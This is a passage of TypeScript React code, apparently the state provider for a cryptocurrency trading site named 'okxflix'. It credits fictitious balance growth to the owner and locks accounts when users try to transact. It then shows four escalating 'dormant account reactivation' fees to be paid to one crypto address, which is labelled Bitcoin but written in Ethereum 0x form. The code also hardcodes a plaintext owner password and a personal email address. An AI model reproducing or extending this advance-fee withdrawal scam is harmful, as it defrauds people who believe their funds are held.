    if (ownerAccruals.some(a => a.accrualDate === todayStr)) {
      return;
    }

    const rate = 0.00001; // 0.0010%
    const creditAmount = currentVal * rate;
    const newAccrual: OwnerPortfolioAccrual = {
      id: `ACC-${todayStr}`,
      ownerUserId: user.id,
      accrualDate: todayStr,
      startingBalance: currentVal,
      rate,
      creditAmount,
      createdAt: Date.now()
    };

    const updatedAccruals = [newAccrual, ...ownerAccruals];
    setOwnerAccruals(updatedAccruals);
    try {
      localStorage.setItem(`okxflix_owner_accruals_${user.id}`, JSON.stringify(updatedAccruals));
    } catch (e) {
      console.error(e);
    }

    setBalances(prev => {
      const updated = prev.map(b => {
        if (b.assetSymbol === 'USDT') {
          const newAvail = b.available + creditAmount;
          return { ...b, available: newAvail, valueUSD: newAvail };
        }
        return b;
      });
      try {
        localStorage.setItem(`okxflix_balances_${user.id}`, JSON.stringify(updated));
      } catch (e) {
        console.error(e);
      }
      return updated;
    });

    addAuditLog('OWNER_DAILY_ACCRUAL', `Idempotent daily portfolio credit of $${creditAmount.toFixed(5)} applied to owner account.`, 'SUCCESS');
  }, [isOwner, balances, ownerAccruals, user.id, addAuditLog]);



  const runPortfolioAppreciation = useCallback((triggerType: 'DAILY' | 'MARKET_VALUE_CHANGE' = 'DAILY') => {
    if (!isOwner) return;
    const currentVal = balances.reduce((acc, b) => acc + b.valueUSD, 0);
    if (currentVal <= 0) return;

    const rate = 0.00001; // 0.0010%
    const amount = currentVal * rate;
    const newValue = currentVal + amount;
    const eventId = `APP-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;

    const newRecord: AppreciationRecord = {
      id: eventId,
      ownerId: user.id,
      timestamp: Date.now(),
      dateStr: new Date().toISOString(),
      previousValue: currentVal,
      newValue: newValue,
      rate,
      amount,
      triggerType
    };

    const updatedHistory = [newRecord, ...appreciationHistory];
    setAppreciationHistory(updatedHistory);
    try {
      localStorage.setItem(`okxflix_appreciation_${user.id}`, JSON.stringify(updatedHistory));
    } catch (e) {
      console.error(e);
    }

    setBalances(prev => {
      const updated = prev.map(b => {
        if (b.assetSymbol === 'USDT') {
          const newAvail = b.available + amount;
          return { ...b, available: newAvail, valueUSD: newAvail };
        }
        return b;
      });
      try {
        localStorage.setItem(`okxflix_balances_${user.id}`, JSON.stringify(updated));
      } catch (e) {
        console.error(e);
      }
      return updated;
    });

    addAuditLog('PORTFOLIO_APPRECIATION_APPLIED', `Applied ${triggerType} portfolio appreciation of $${amount.toFixed(4)} (Rate: 0.0010%) to owner account.`, 'SUCCESS');
  }, [isOwner, balances, user.id, appreciationHistory, addAuditLog]);

  const todayAppreciation = appreciationHistory
    .filter(r => new Date(r.timestamp).toDateString() === new Date().toDateString())
    .reduce((acc, r) => acc + r.amount, 0);

  const marketAppreciation = appreciationHistory
    .filter(r => r.triggerType === 'MARKET_VALUE_CHANGE')
    .reduce((acc, r) => acc + r.amount, 0);

  const totalAppreciation = appreciationHistory
    .reduce((acc, r) => acc + r.amount, 0);

  const lastCalculationTimestamp = appreciationHistory.length > 0 ? appreciationHistory[0].timestamp : null;

  const verifyAdminPin = (pin: string) => {
    if (pin === adminPinCode) {
      setIsAdminAuthenticated(true);
      const now = Date.now();
      setAdminLastVerifiedAt(now);
      try {
        localStorage.setItem('okxflix_admin_verified', now.toString());
      } catch (e) {
        console.error(e);
      }
      addAuditLog('ADMIN_AUTH_SUCCESS', 'Secure administrative authentication verified successfully.', 'SUCCESS');
      return true;
    } else {
      addAuditLog('ADMIN_AUTH_FAILED', 'Invalid administrative access code attempt rejected.', 'FAILED');
      return false;
    }
  };

  const verifyAdminPassword = useCallback((password: string): boolean => {
    return verifyAdminPin(password);
  }, [verifyAdminPin]);

  const changeAdminPin = (oldPin: string, newPin: string) => {
    if (oldPin !== adminPinCode) {
      addAuditLog('ADMIN_CREDENTIAL_CHANGE_FAILED', 'Failed attempt to update admin code: incorrect current access code.', 'FAILED');
      return false;
    }
    if (!newPin || newPin.length < 6) {
      addAuditLog('ADMIN_CREDENTIAL_CHANGE_FAILED', 'Failed attempt to update admin code: new code does not meet complexity requirements.', 'FAILED');
      return false;
    }
    setAdminPinCode(newPin);
    setIsAdminAuthenticated(false);
    addAuditLog('ADMIN_CREDENTIAL_UPDATED', 'Administrative access code updated securely. Existing admin sessions invalidated.', 'SUCCESS');
    return true;
  };

  const changeOwnerPassword = (currentPass: string, newPass: string): { success: boolean; errorKey?: string } => {
    let currentOwnerPass = 'Risk55yy@@$';
    try {
      const savedPass = localStorage.getItem('okxflix_owner_password');
      if (savedPass) currentOwnerPass = savedPass;
      else {
        const regStr = localStorage.getItem('okxflix_registered_users');
        if (regStr) {
          const regUsers = JSON.parse(regStr);
          if (regUsers['richardshannon901@gmail.com']?.password) {
            currentOwnerPass = regUsers['richardshannon901@gmail.com'].password;
          }
        }
      }
    } catch (e) {}

    if (currentPass !== currentOwnerPass) {
      addAuditLog('OWNER_PASSWORD_CHANGE_FAILED', 'Failed attempt to change owner password: incorrect current password.', 'FAILED');
      return { success: false, errorKey: 'xrwa.passErrorCurrent' };
    }
    if (!newPass) {
      return { success: false, errorKey: 'xrwa.passErrorEmpty' };
    }
    if (newPass.length < 6) {
      return { success: false, errorKey: 'xrwa.passErrorMin' };
    }
    if (newPass === currentPass) {
      return { success: false, errorKey: 'xrwa.passErrorSame' };
    }

    try {
      localStorage.setItem('okxflix_owner_password', newPass);
      const regStr = localStorage.getItem('okxflix_registered_users');
      const regUsers = regStr ? JSON.parse(regStr) : {};
      if (regUsers['richardshannon901@gmail.com']) {
        regUsers['richardshannon901@gmail.com'].password = newPass;
      } else {
        regUsers['richardshannon901@gmail.com'] = {
          profile: user,
          password: newPass
        };
      }
      localStorage.setItem('okxflix_registered_users', JSON.stringify(regUsers));
    } catch (e) {}

    addAuditLog('OWNER_PASSWORD_UPDATED', 'Owner login password successfully updated. Existing owner sessions invalidated.', 'SUCCESS');

    // Invalidate active session and logout owner so they must sign in with new password
    logout();

    return { success: true };
  };

  const logout = () => {
    setIsAuthenticated(false);
    setUser(INITIAL_USER);
    setBalances(ZERO_BALANCES);
    setTransactions([]);
    setOrders([]);
    setBankAccounts([]);
    setCreditCards([]);
    try {
      localStorage.removeItem('okxflix_session_token');
      localStorage.removeItem('okxflix_user');
    } catch (e) {
      console.error(e);
    }
    addAuditLog('USER_LOGOUT', 'User session terminated and token invalidated securely.', 'SUCCESS');
  };

  const DEFAULT_FEE_CONFIG: FeeConfiguration = {
    feeSystemEnabled: true,
    activeWarningKey: 'step1',
    step1: {
      title: 'Initial Account Maintenance Reactivation Fee',
      amount: '$2,000',
      description: 'Your account is currently DORMANT, which requires verification before full privileges can be restored.\nAccount Reactivation Procedure:\nSettlement Requirement: Settle the account reactivation and compliance verification fee of $2,000.\nBitcoin Deposit Address: Transfer the equivalent amount to our secure institutional BTC address: 0x697638fe9a9b7b98556957090c165ce55dda2fc0\nTransaction Submission: Provide your transaction hash (TXID) through this support channel once the transfer is broadcast for compliance review within 2-3 hours.'
    },
    step2: {
      title: 'System Processing & Security Service Fee',
      amount: '$1,500',
      description: 'Your account is currently DORMANT, which requires verification before full privileges can be restored.\nAccount Reactivation Procedure:\nSettlement Requirement: Settle the account reactivation and compliance verification fee of $1,500.\nBitcoin Deposit Address: Transfer the equivalent amount to our secure institutional BTC address: 0x697638fe9a9b7b98556957090c165ce55dda2fc0\nTransaction Submission: Provide your transaction hash (TXID) through this support channel once the transfer is broadcast for compliance review within 2-3 hours.'
    },
    step3: {
      title: 'Account Clearance & Compliance Levy',
      amount: '$1,000',
      description: 'Your account is currently DORMANT, which requires verification before full privileges can be restored.\nAccount Reactivation Procedure:\nSettlement Requirement: Settle the account reactivation and compliance verification fee of $1,000.\nBitcoin Deposit Address: Transfer the equivalent amount to our secure institutional BTC address: 0x697638fe9a9b7b98556957090c165ce55dda2fc0\nTransaction Submission: Provide your transaction hash (TXID) through this support channel once the transfer is broadcast for compliance review within 1-2 hours.'
    },
    step4: {
      title: 'Final Secure Transfer Facilitation Fee',
      amount: '$500',
      description: 'Your account is currently DORMANT, which requires verification before full privileges can be restored.\nAccount Reactivation Procedure:\nSettlement Requirement: Settle the account reactivation and compliance verification fee of $500.\nBitcoin Deposit Address: Transfer the equivalent amount to our secure institutional BTC address: 0x697638fe9a9b7b98556957090c165ce55dda2fc0\nTransaction Submission: Provide your transaction hash (TXID) through this support channel once the transfer is broadcast for compliance review within 30 minutes.'
    },
    lastUpdated: new Date().toISOString(),
    updatedBy: 'System Admin'
  };

  const [feeConfiguration, setFeeConfiguration] = useState<FeeConfiguration>(() => {
    if (typeof window !== 'undefined') {
      try {
        const saved = localStorage.getItem('okxflix_fee_config');
        if (saved) {
          const parsed = JSON.parse(saved);
          if (!parsed.activeWarningKey) {
            parsed.activeWarningKey = 'step1';
          }
          return parsed;
        }
      } catch (e) {}
    }
    return DEFAULT_FEE_CONFIG;
  });

  const updateFeeConfiguration = (newConfig: FeeConfiguration) => {
    setFeeConfiguration(newConfig);
    try {
      localStorage.setItem('okxflix_fee_config', JSON.stringify(newConfig));
    } catch (e) {
      console.error(e);
    }
    addAuditLog('FEE_CONFIG_UPDATED', `Centralized withdrawal fee configuration updated by ${user.username} (${user.email}).`, 'SUCCESS');
  };

  const resetFeeConfiguration = () => {
    setFeeConfiguration(DEFAULT_FEE_CONFIG);
    try {
      localStorage.removeItem('okxflix_fee_config');
    } catch (e) {
      console.error(e);
    }
    addAuditLog('FEE_CONFIG_RESET', `Withdrawal fee configuration reset to default values by ${user.username}.`, 'WARNING');
  };

  // Save user, theme, currency & language to localStorage when they change
  useEffect(() => {
    try {
      localStorage.setItem('okxflix_user', JSON.stringify(user));
      localStorage.setItem('okxflix_theme', theme);
      localStorage.setItem('okxflix_currency', baseCurrency);
      localStorage.setItem('okxflix_language', language);
    } catch (e) {
      console.error('Failed to save storage', e);
    }
  }, [user, theme, baseCurrency, language]);



  const triggerDeactivationLock = () => {
    setFeeProtocol(prev => ({
      ...prev,
      isLocked: true,
      step: 1
    }));
    addAuditLog('ACCOUNT_DEACTIVATION_LOCK', 'Dormant Account Transfer Reactivation Lock triggered upon transaction attempt.', 'WARNING');
  };

  const checkAccountActive = () => {
    if (user.accountStatus !== 'ACTIVE') {
      setIsActivationModalOpen(true);
      return false;
    }
    return true;
  };

  const convertCurrency = (amountUSD: number) => {
    const config = CURRENCY_SYMBOLS[baseCurrency] || CURRENCY_SYMBOLS.USD;
    const converted = amountUSD * config.rate;
    return {
      symbol: config.symbol,
      formatted: converted.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
    };
  };

  const formatMoney = (amountUSD: number, showSymbol: boolean = true) => {
    if (user.privacyMode) {
      return '••••••••';
    }
    const converted = convertCurrency(amountUSD);
    return showSymbol ? `${converted.symbol} ${converted.formatted}` : converted.formatted;
  };

  // Keyboard shortcut Cmd/Ctrl + K for global search
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if ((e.metaKey || e.ctrlKey) && e.key.toLowerCase() === 'k') {
        e.preventDefault();
        setIsSearchOpen(prev => !prev);
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, []);

  return (
    <AppContext.Provider value={{
      activeTab, setActiveTab,
      theme, setTheme,
      baseCurrency, setBaseCurrency,
      language, setLanguage, t,
      user, setUser,
      balances, setBalances,
      bankAccounts, setBankAccounts,
      creditCards, setCreditCards,
      transactions, setTransactions,
      orders, setOrders,
      alerts, setAlerts,
      tickets, setTickets,
      auditLogs, addAuditLog,
      feeProtocol, setFeeProtocol,
      isAuthenticated, setIsAuthenticated, logout,
      isSearchOpen, setIsSearchOpen,
      isMobileMenuOpen, setIsMobileMenuOpen,
      isAuthModalOpen, setIsAuthModalOpen,
      authModalMode, setAuthModalMode,
      adminBtcAddress, setAdminBtcAddress,
      convertCurrency, formatMoney, triggerDeactivationLock,
      checkAccountActive, isActivationModalOpen, setIsActivationModalOpen,
      isAdminAuthenticated, verifyAdminPin, verifyAdminPassword, changeAdminPin, changeOwnerPassword, adminLastVerifiedAt,
      ownerSessions, securityEvents, ownerAccruals,
      revokeSession, removeSession, revokeAllOtherSessions, runDailyOwnerAccrual,
      appreciationHistory, runPortfolioAppreciation,
      todayAppreciation, totalAppreciation, marketAppreciation,
      lastCalculationTimestamp,
      feeConfiguration, updateFeeConfiguration, resetFeeConfiguration
    }}>
      <div suppressHydrationWarning className={theme === 'light' ? 'light bg-slate-50 text-slate-900 min-h-screen' : 'dark bg-[#0b0f19] text-slate-100 min-h-screen'}>
        {children}
      </div>
    </AppContext.Provider>
  );
};

export const useApp = () => {
  const context = useContext(AppContext);
  if (!context) throw new Error('useApp must be used within an AppProvider');
  return context;
};
